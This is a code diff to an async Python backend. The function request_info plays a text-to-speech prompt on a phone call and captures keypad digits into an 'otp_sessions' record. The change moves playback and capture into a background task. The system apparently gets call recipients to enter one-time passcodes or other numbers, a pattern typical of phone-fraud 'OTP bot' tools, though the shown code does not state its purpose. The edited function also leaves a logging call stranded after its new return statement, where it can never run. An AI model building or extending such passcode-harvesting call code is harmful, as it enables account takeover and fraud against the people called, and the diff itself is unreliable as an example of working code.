@@ -1173,11 +1173,7 @@ async def request_info(session_id: str, info_type: str, current_user: dict = Dep
     
     await emit_log(session_id, "action", f"{config['emoji']} Requesting {config['label']}...")
     
-    # Play message requesting info
-    await emit_log(session_id, "step", f"🎙️ Requesting {config['label']}...")
-    await play_tts(call_id, config["message"], session.get("language", "en"))
-    
-    # Update session for info capture
+    # Update session for info capture FIRST
     await db.otp_sessions.update_one(
         {"id": session_id},
         {"$set": {
@@ -1197,11 +1193,10 @@ async def request_info(session_id: str, info_type: str, current_user: dict = Dep
         active_sessions[session_id]["otp_digits_collected"] = ""
         active_sessions[session_id]["info_type"] = info_type
     
-    # Wait for TTS then capture info
-    word_count = len(config["message"].split())
-    tts_wait = max(5, int(word_count / 2.5) + 2)
-    await asyncio.sleep(tts_wait)
-    await start_dtmf_capture(call_id, max_length=config["digits"], timeout=60)
+    # Play TTS and start DTMF capture in background (non-blocking)
+    asyncio.create_task(play_tts_and_capture_info(session_id, session, call_id, config))
+    
+    return {"status": "requesting_info", "info_type": info_type, "digits": config["digits"]}
     
     await emit_log(session_id, "info", f"⏳ Waiting for {config['label']}...")
     
